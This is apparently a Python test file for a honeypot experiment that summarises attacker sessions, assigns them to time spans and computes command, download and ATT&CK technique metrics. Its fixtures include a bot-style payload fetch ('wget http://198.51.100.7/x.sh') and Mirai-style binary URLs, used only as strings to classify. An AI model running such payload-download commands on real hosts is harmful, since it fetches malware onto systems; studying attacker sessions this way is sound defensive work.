"""Per-session facts and per-block metrics for the persona experiment (R3). Pure."""

from datetime import UTC, datetime, timedelta

import pytest

from app.services.experiment.sessions import (
    COMMAND,
    LOGIN,
    PRIMARY,
    SCRIPT_PRIMARY,
    Event,
    SessionStats,
    arch_mix,
    assign,
    metrics,
    script_metrics,
    summarize,
    technique_mix,
    techniques,
    url_arch,
)

T0 = datetime(2026, 10, 1, tzinfo=UTC)
WGET = "wget http://198.51.100.7/x.sh"


def _session(sid, *, start=T0, seconds=60, logged_in=True, commands=(), archs=()):
    return SessionStats(
        sid, start, start + timedelta(seconds=seconds), logged_in, tuple(commands), tuple(archs)
    )


@pytest.mark.parametrize(
    ("url", "arch"),
    [
        ("http://198.51.100.7/bins/x86_64", "x86"),
        ("http://198.51.100.7/mirai.arm7", "arm"),
        ("http://198.51.100.7/a/b/sora.mpsl", "mips"),
        ("http://198.51.100.7/aarch64?x=1", "arm"),
        ("http://198.51.100.7/i686", "x86"),
        ("http://198.51.100.7/arm/i", "none"),  # only the last segment counts
        ("http://198.51.100.7/i", "none"),
    ],
)
def test_the_url_names_the_architecture(url: str, arch: str) -> None:
    assert url_arch(url) == arch


def test_a_session_is_summarised_from_its_events_in_order() -> None:
    events = [
        Event(T0, "cowrie.session.connect"),
        Event(T0 + timedelta(seconds=2), LOGIN),
        Event(T0 + timedelta(seconds=3), COMMAND, command="uname -a"),
        Event(T0 + timedelta(seconds=4), COMMAND, command=WGET),
        Event(
            T0 + timedelta(seconds=5), "cowrie.session.file_download.failed", url="http://h/x86_64"
        ),
        Event(T0 + timedelta(seconds=6), "cowrie.session.file_download"),  # no URL
        Event(T0 + timedelta(seconds=9), "cowrie.session.closed"),
    ]
    s = summarize("s1", events)
    assert (s.first, s.last, s.duration_s) == (T0, T0 + timedelta(seconds=9), 9.0)
    assert s.logged_in and s.commands == ("uname -a", WGET)
    assert (s.download_archs, s.downloads) == (("x86", "none"), 2)
    assert s.script is not None and s.script == summarize("s2", events).script
    assert techniques(s) == {"T1082", "T1105"}


def test_a_session_without_a_login_or_commands() -> None:
    s = summarize("s3", [Event(T0, "cowrie.session.connect"), Event(T0, "cowrie.session.closed")])
    assert (s.logged_in, s.commands, s.script, s.downloads) == (False, (), None, 0)
    assert techniques(s) == frozenset()


def test_sessions_go_to_the_span_holding_their_first_event() -> None:
    mid = T0 + timedelta(days=1)
    spans = [(T0, mid), (mid, mid + timedelta(days=1))]
    kept = _session("kept", start=T0 + timedelta(hours=1))
    cut = _session("cut", start=mid - timedelta(seconds=30), seconds=60)  # runs past the switch
    edge = _session("edge", start=mid - timedelta(seconds=60), seconds=60)  # last event AT the end
    second = _session("second", start=mid)  # first event at the boundary: the next span
    spray = _session("spray", start=T0 + timedelta(hours=2), logged_in=False)
    outside = _session("outside", start=T0 - timedelta(hours=1))
    first, last = assign([kept, cut, edge, second, spray, outside], spans)
    assert [s.session_id for s in first.sessions] == ["kept"]
    assert (first.cut, first.not_logged_in) == (2, 1)
    assert [s.session_id for s in last.sessions] == ["second"]


def test_a_session_ending_near_the_span_end_is_cut() -> None:
    end = T0 + timedelta(days=1)
    spans = [(T0, end)]

    def ending(sid: str, before_s: int):
        return _session(sid, start=end - timedelta(seconds=before_s + 5), seconds=5)

    near, far = ending("near", 10), ending("far", 130)
    (tally,) = assign([near, far], spans)
    assert [s.session_id for s in tally.sessions] == ["far"]
    assert tally.cut == 1


def test_block_metrics_per_session() -> None:
    sessions = [
        _session("a", seconds=10),
        _session("b", seconds=20, commands=["uname -a"]),
        _session("c", seconds=30, commands=["uname -a", WGET], archs=["arm"]),
        _session("d", seconds=40, commands=["ls"]),
    ]
    m = metrics(sessions)
    assert set(m) == {*PRIMARY, "duration_median_s"}
    assert m["ran_any_share"] == pytest.approx(0.75)
    assert m["commands_mean"] == pytest.approx(1.0)
    assert m["download_share"] == pytest.approx(0.25)
    assert m["duration_median_s"] == pytest.approx(25.0)


def test_one_vote_per_script() -> None:
    bot = [_session(f"bot{i}", commands=["uname -a"]) for i in range(3)]
    loader = _session("loader", commands=[WGET], archs=["x86"])
    session_view, script_view = metrics([*bot, loader]), script_metrics([*bot, loader])
    assert session_view["download_share"] == pytest.approx(0.25)
    assert script_view["download_share"] == pytest.approx(0.5)  # two scripts, one downloads
    assert set(script_view) == {*SCRIPT_PRIMARY, "duration_median_s", "scripts"}
    assert script_view["scripts"] == 2


def test_sessions_without_commands_vote_as_one_group() -> None:
    silent = [_session(f"s{i}") for i in range(3)]
    busy = _session("busy", commands=["uname -a"])
    m = script_metrics([*silent, busy])
    assert m["commands_mean"] == pytest.approx(0.5)  # (0 + 1) / 2 groups
    assert m["scripts"] == 1  # the no-command group is not a script


def test_technique_and_architecture_mixes() -> None:
    sessions = [
        _session("a", commands=["uname -a"]),
        _session("b", commands=["uname -a", WGET], archs=["arm", "arm", "x86"]),
    ]
    assert technique_mix(sessions) == {"T1082": 1.0, "T1105": 0.5}
    assert arch_mix(sessions) == pytest.approx({"arm": 2 / 3, "x86": 1 / 3})
    assert arch_mix([_session("c")]) == {}
